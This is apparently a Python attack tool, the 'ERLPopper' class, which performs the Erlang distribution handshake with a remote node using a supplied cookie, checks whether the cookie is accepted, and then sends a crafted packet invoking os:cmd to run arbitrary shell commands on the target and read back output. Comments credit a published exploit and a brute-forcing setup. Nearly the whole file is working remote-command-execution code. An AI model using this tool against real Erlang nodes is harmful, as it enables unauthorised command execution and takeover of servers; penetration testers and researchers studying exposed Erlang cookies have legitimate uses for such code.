from random import choice
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from struct import pack, unpack
from string import ascii_uppercase
from hashlib import md5
from binascii import hexlify, unhexlify

class ERLPopper:
    _UTF8    = "utf-8"

    class Error(Exception):
        pass

    class StatusError(Exception):
        def __init__(self, status, message):
            self.status = status
            self.message = message

    class VersionError(Exception):
        def __init__(self, version, message):
            self.version = version
            self.message = message

    class EmptyResponseError(Exception):
        def __init__(self, message):
            self.message = message

    def __init__(self, target, cookie, version=6, challenge=None, cmd=None, verbose=False):
        (host, port) = target.split(':')
        self.remote_host = host
        self.remote_port = int(port)
        self.cookie = cookie
        self.challenge = challenge
        self.cmd = cmd
        self.version = version
        self._VERBOSE = verbose

        if self.version != 5:
            # [TODO] Implement version 6 handshake
            self._log_verbose(f"Version {self.version} not implemented.")
            raise NotImplementedError()

        # Generate a node name to identify as
        self.node_name = self._generate_node_name()

        # Create a socket, die if none
        self._sock = socket(AF_INET, SOCK_STREAM, 0)
        assert(self._sock)

    def _log_verbose(self, data):
        if self._VERBOSE:
            print(f"[d] {data}")

    def _generate_node_name(self, n=6):
        '''
        Generate a node@host name for this instance.
        '''

        name = ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

        self._log_verbose(f"Generated node name: '{repr(name)}'")
        
        return name

    def _connect(self):
        # Connect to target
        self._log_verbose(f"  Connecting to {self.remote_host}:{self.remote_port}")
        self._sock.connect((self.remote_host, self.remote_port))

    def _generate_name_packet_old(self, name=None):
        '''
        Old v5 format:
        |--------|----|--------|----------------|-----------------------------------|
        |\x00\x10|'n' |\x00\x05|\x00\x03\x49\x9c|NAME@node ....                     |
        |--------|----|--------|----------------|-----------------------------------|
            |      |       |           |             |
            |      |       |           |             |-- our node name
            |      |       |           |
            |      |       |           |-- 32-bit capability flags bitfield:
            |      |       |           |--  See capability flags section below
            |      |       |
            |      |       |-- Version (always 5 for old format)
            |      |
            |      |-- Message tag ('n' for old format, 'N' for new)
            |
            |-- Message length set to 16 in this example for the length of the message that follows:
            |--   16 = 1 + 2 + 4 + len(node_name)
            |--   Does not include these 2 bytes

        Capability flags / distribution flags
        http://erlang.org/doc/apps/erts/erl_dist_protocol.html#dflags

        This is how we let the other node know about our capabilities. This value 
        was in the original exploit.

        0x0003499c == 0b0000 0000 0011 0100 1001 1001 1100
                           |        ||  |   |  | |  | ||-- DFLAG_EXTENDED_REFERENCES
                           |        ||  |   |  | |  | |-- DFLAG_DIST_MONITOR
                           |        ||  |   |  | |  |-- DFLAG_FUN_TAGS
                           |        ||  |   |  | |-- DFLAG_NEW_FUN_TAGS 
                           |        ||  |   |  |-- DFLAG_EXTENDED_PIDS_PORTS 
                           |        ||  |   |-- DFLAG_NEW_FLOATS 
                           |        ||  |-- DFLAG_SMALL_ATOM_TAGS
                           |        ||-- DFLAG__UTF8_ATOMS
                           |        |-- DFLAG_MAP_TAG 
                           |-- DFLAG_HANDSHAKE_23

        This value didn't work on a different (newer??) implementation. Using 
        tcpdump I captured a session using the official erl and saw the flags 
        was different. Dropping in this new value allowed all tests to 
        complete successfully. Basically we're showing that we support more 
        options.

        ** = new

        Consider changing:
          -DFLAG_PUBLISHED: "The node is to be published and part of the global namespace."
          -DFLAG_DIST_MONITOR_NAME: "The node impelemnts distributed named proces monitoring."
          -DFLAG_EXPORT_PTR_TAG: "The nude understands the EXPORT_EXT tag."
          -DFLAG_BIT_BINARIES: "The node understands the BIT_BINARY_EXT tag."
          -DFLAG_UNICODE_IO,-DFLAG_DIST_HDR_ATOM_CACHE: "The node implements atom cache in distribution header."
          +DFLAG_BIG_CREATION: "The node understands big node creation tags..."
          -DFLAG_SEND_SENDER: Indicates we'll use the new SEND_SENDER control message.

        0x00df7fbd == 0b0000 1101 1111 0111 1111 1011 1101
                           | || | ||||  ||| |||| | || || |-- DFLAG_PUBLISHED**-
                           | || | ||||  ||| |||| | || ||-- DFLAG_EXTENDED_REFERENCES
                           | || | ||||  ||| |||| | || |-- DFLAG_DIST_MONITOR
                           | || | ||||  ||| |||| | ||-- DFLAG_FUN_TAGS
                           | || | ||||  ||| |||| | |-- DFLAG_DIST_MONITOR_NAME**-
                           | || | ||||  ||| |||| |-- DFLAG_NEW_FUN_TAGS
                           | || | ||||  ||| ||||-- DFLAG_EXTENDED_PIDS_PORTS
                           | || | ||||  ||| |||-- DFLAG_EXPORT_PTR_TAG**-
                           | || | ||||  ||| ||-- DFLAG_BIT_BINARIES**-
                           | || | ||||  ||| |-- DFLAG_NEW_FLOATS
                           | || | ||||  |||-- DFLAG_UNICODE_IO**-
                           | || | ||||  ||-- DFLAG_DIST_HDR_ATOM_CACHE**-
                           | || | ||||  |-- DFLAG_SMALL_ATOM_TAGS
                           | || | ||||-- DFLAG__UTF8_ATOMS
                           | || | |||-- DFLAG_MAP_TAG
                           | || | ||-- DFLAG_BIG_CREATION**+
                           | || | |-- DFLAG_SEND_SENDER**-
                           | || |-- DFLAG_SEQTRACE_LABELS**
                           | ||-- DFLAG_EXIT_PAYLOAD**
                           | |-- DFLAG_FRAGMENTS**
                           |-- DFLAG_HANDSHAKE_23 (still not set)

        Tl; dr:
        The only difference between the working and non working flags was the 
        addition of the DFLAG_BIG_CREATION bit (0x40000). New working value is 0x7499c
        This will likely change as you encounter different distributions.
        '''

        if not name:
            name = self.node_name

        #packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0x3499c) + bytes(name, self._UTF8)
        packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0x7499c) + bytes(name, self._UTF8)

        return packet

    def _generate_name_packet_new(self, name=None):
        '''
        New v6 format:
        |--------|----|--------------------------------|--------|--------|----------|
        |\x00\x18|'N' |\x00\x00\x00\x00\x00\x03\x49\x9c|????    |\x00\x0e|NAME@node |
        |--------|----|--------------------------------|--------|--------|----------|
            |      |                 |                     |         |     |
            |      |                 |                     |         |     |-- our node name
            |      |                 |                     |         |
            |      |                 |                     |         |-- Nlen 16-bit length of node name
            |      |                 |                     |
            |      |                 |                     |-- Creation "is the node incarnation identifier
            |      |                 |                     |--   used by this node to create its PIDs, ports, 
            |      |                 |                     |--   and references.
            |      |                 |
            |      |                 |-- 64-bit capability flags bitfield
            |      |                 |--  See capability flags section below
            |      |
            |      |-- Message tag ('N' for new format)
            |
            |-- Message length set to 24 for the length of the message that follows:
            |--   24 = 1 + 8 + 4 + 2 + len(node_name)
            |--   Does not include these 2 bytes

        Capability flags / distribution flags

        Version 6 introduced the DFLAG_HANDSHAKE_23 which indicates this node 
        supports the OTP 23 handshake process. We must set this flag to show 
        we can do a handshake with newer nodes.

        Setting that bit gives our v6_flags value 0x0103499c.
        '''
        if not name:
            name = self.node_name

        #name = "maik@ubu-brute01-maik"
        packet = pack('!HcQIH', 15 + len(name), b'N', 0x103499c, 0xdeadbeef, len(name)) + bytes(name, self._UTF8)

        return packet

    def send_name(self, name=None):
        self._log_verbose("  send_name")

        if self.version == 5:
            packet = self._generate_name_packet_old(name)
        elif self.version == 6:
            packet = self._generate_name_packet_new(name)
        else:
            raise self.VersionError(version=self.version, message=f"Invalid version: '{repr(self.version)}")

        self._log_verbose(f"    Generated name packet: '{repr(packet)}'")

        try:
            self._sock.sendall(packet)
        except BrokenPipeError:
            self._log_verbose(f"    send_name failed. Is host reachable?")
            raise

    def _recv_status(self):
        '''
        recv_status
        '''
        self._log_verbose("  recv_status")

        # Receive 2 byte len
        msg_len = self._sock.recv(2)
        # Raise exception if empty
        if msg_len == b'':
            raise self.EmptyResponseError(message=f"Expected 2-byte integer length but got: '{repr(msg_len)}'")

        self._log_verbose(f"    Received msg_len: '{repr(msg_len)}'")

        msg_len = int.from_bytes(msg_len, "big")

        # Receive remainder of message
        data = self._sock.recv(msg_len)
        (tag, msg) = unpack(f'!c{msg_len-1}s', data[:msg_len])

        # We are expecting 's' tag
        assert(tag.decode(self._UTF8) == 's')

        msg = msg.decode(self._UTF8)

        self._log_verbose(f"    Received msg: '{repr(msg)}'")

        return msg

    def _recv_challenge(self):
        '''
        recv_challenge
        '''
        self._log_verbose("  recv_challenge")

        # Receive 2 byte len
        msg_len = self._sock.recv(2)
        self._log_verbose(f"    Received msg_len: '{repr(msg_len)}'")

        msg_len = int.from_bytes(msg_len, "big")

        # Receive remainder of message
        data = self._sock.recv(msg_len)
        # 1 + 2 + 4 + 4 = 11
        (tag, version, flags, challenge, name) = unpack(f'!cHII{msg_len-11}s', data[:msg_len])
        self._log_verbose(f"    Received tag: '{tag}', version: '{version}', flags: '{flags}', challenge: '{challenge}', name: '{name}'")
        
        # We are expecting 'n' tag
        assert(tag.decode(self._UTF8) == 'n')

        return challenge

    def _generate_challenge_reply_packet(self, challenge):
        m = md5()
        m.update(self.cookie.encode(self._UTF8))
        m.update(str(challenge).encode(self._UTF8))
        response = m.digest()
        self._log_verbose(f"    Generated digest: '{repr(response)}'")

        packet = pack('!HcI', len(response)+5, b'r', challenge) + response

        return packet

    def _send_challenge_reply(self, challenge):
        '''
        send_challenge_reply
        '''
        self._log_verbose("  send_challenge_reply")

        packet = self._generate_challenge_reply_packet(challenge)

        self._log_verbose(f"    Sending: {packet}")
        self._sock.sendall(packet)

    def _recv_challenge_ack(self):
        '''
        recv_challenge_ack
        '''
        self._log_verbose("  recv_challenge_ack")

        # Receive 2 byte len
        msg_len = self._sock.recv(2)
        self._log_verbose(f"    Received msg_len: '{repr(msg_len)}'")

        msg_len = int.from_bytes(msg_len, "big")

        # If the message returned doesn't include a digest then auth failed
        if msg_len < 17: # 1 + 16
            digest = False
        else:
            # Receive remainder of message
            data = self._sock.recv(msg_len)
            (tag, digest) = unpack(f'!c16s', data[:msg_len])
            self._log_verbose(f"    Received tag: '{tag}', digest: '{digest}'")

            # We are expecting 'a' tag
            assert(tag.decode(self._UTF8) == 'a')

        return digest
        
    def check_cookie(self, cookie=None):
        try:
            self._connect()
        except:
            pass

        if not cookie:
            cookie = self.cookie

        # Set the cookie every time so if we re-use this object (like for send_cmd) we are already set up
        #  Did the same thing with node_name
        self.cookie = cookie
        self._log_verbose(f"  Trying cookie: '{repr(cookie)}'")

        # send_name
        try:
            self.send_name()
        except self.VersionError as e:
            raise

        # recv_status
        try:
            status = self._recv_status()
        except self.EmptyResponseError as e:
            raise

        #if status == 'alive':
        #    self._send_status('true')
        #elif ...
        result = False
        if status == 'ok' or status == 'ok_simultaneous':
            self._log_verbose(f"    Got good status response: '{repr(status)}'")
            challenge = self._recv_challenge()
            
            # Not sure how useful this is
            if self.challenge:
                challenge = self.challenge

            self._send_challenge_reply(challenge)

            digest = self._recv_challenge_ack()

            result = (digest != False)
        else:
            # 'not_allowed' and others
            self._log_verbose(f"    Got bad status response: '{repr(status)}'")
            raise self.StatusError(status=status, message="The connection is disallowed for some (unspecified) security reason. Flags or version mismatch?")

        return result

    def _encode_string(self, in_str, t=0x64):
        # Taken from erl-matter/shell-erldp.py
        return pack('!BH', t, len(in_str)) + bytes(in_str, self._UTF8)

    def _generate_cmd_packet_old(self, cmd, name=None):
        # Taken from erl-matter/shell-erldp.py
        #  wetw0rk broke this down a lot better in his exploit, but both do the same job
        #    https://www.exploit-db.com/exploits/46024
        packet  = unhexlify('70836804610667')
        packet += self._encode_string(name)
        packet += unhexlify('0000000300000000006400006400037265')
        packet += unhexlify('7883680267')
        packet += self._encode_string(name)
        packet += unhexlify('0000000300000000006805')
        packet += self._encode_string('call')
        packet += self._encode_string('os')
        packet += self._encode_string('cmd')
        packet += unhexlify('6c00000001')
        packet += self._encode_string(cmd, 0x6b)
        packet += unhexlify('6a')
        packet += self._encode_string('user')
  
        return pack('!I', len(packet)) + packet

    def _generate_cmd_packet_new(self, cmd, name=None):
        raise NotImplementedError

    def _recv_cmd_resp_old(self):
        '''
        ERTS <= 5.7.2 (OTP R13B) inter-node message format
        "Old" message format

        |-----------------|----|---------------|--------------------|
        |\x00\x00\x00\0xnn|\x70|ControlMessage | Message            |
        |-----------------|----|---------------|--------------------|
                |           |          |            |
                |           |          |            |-- "The message sent to another node using the '!' (in external format[??]).
                |           |          |            |--   Notice that Message is only passed in combination with a ControlMessage 
                |           |          |            |--   encoding a send ('!')."
                |           |          |
                |           |          |-- "A tuple passed using the external format of erlang."
                |           |
                |           |-- Type (0x70 == 112) "pass through"
                |
                |-- 4-byte length

        '''
        # https://erlang.org/doc/apps/erts/erl_dist_protocol.html#protocol-between-connected-nodes
        # Receive 4 byte length
        msg_len = self._sock.recv(4)
        msg_len = int.from_bytes(msg_len, "big")
        self._log_verbose(f"    Response msg_len: {msg_len}")

        data = self._sock.recv(msg_len)
        (t, msg) = unpack(f'!c{msg_len-1}s', data[:msg_len])
        
        # We are expecting a type of 0x70 (112) followed by ControlMessage and possibly Message
        assert(t == b'\x70')
        self._log_verbose(f"  msg: {repr(msg)}")

        # Trying to shortcut the rest of this, but seems consistent on all 2 of my test systems. YMMV
        #   Yes we could be more intelligent (and use the erl python module but it's not native)
        # [TODO] Congrats you found it! Sorry!
        # Find b'\x83'
        msg = msg[msg.find(b'\x83')+1:]

        # Find b'\x83' again!
        msg = msg[msg.find(b'\x83')+1:]
        
        # Find 107 (STRING_EXT) and its 2 byte length
        #  This may not be there if there's no output from the command.
        #msg = msg[msg.find(b'\x6b')+3:]
        string_ext_loc = msg.find(b'\x6b')
        if string_ext_loc > -1:
            msg = msg[string_ext_loc+3:]
        else:
            # Couldn't find STRING_EXT, return raw response
            msg = data

        self._log_verbose(f"  msg: {repr(msg)}")

        return msg

    def _recv_cmd_resp_new(self):
        raise NotImplementedError

    def _recv_cmd_resp(self):
        '''
        recv_cmd_resp_old
        '''

        res = ""

        if self.version == 5:
            res = self._recv_cmd_resp_old()
        elif self.version == 6:
            res = self._recv_cmd_resp_new()
        else:
            raise self.VersionError(version=self.version, message=f"Invalid version: '{repr(self.version)}")

        return res

    def send_cmd(self, cmd, name=None):
        self._log_verbose("send_cmd")

        # cmd is required
        assert(cmd)
        #if not cmd:
        #    raise ValueError("No command specified.")

        # must have good cookie
        assert(self.check_cookie())

        self._log_verbose(f"  cmd: {cmd}, cookie: {self.cookie}, name: {self.node_name}")

        #if not self.check_cookie():
        #    raise 

        # Do this after so the object is initialized to a ready state
        # self.node_name is set with ever self.send_name so don't need to track it
        if not name:
            name = self.node_name

        packet = ""

        if self.version == 5:
            packet = self._generate_cmd_packet_old(cmd, name)
        elif self.version == 6:
            packet = self._generate_cmd_packet_new(cmd, name)
        else:
            raise self.VersionError(version=self.version, message=f"Invalid version: '{repr(self.version)}")

        # Send the command payload
        self._sock.sendall(packet)

        # Receive and decode the output (if any)
        res = self._recv_cmd_resp()

        return res
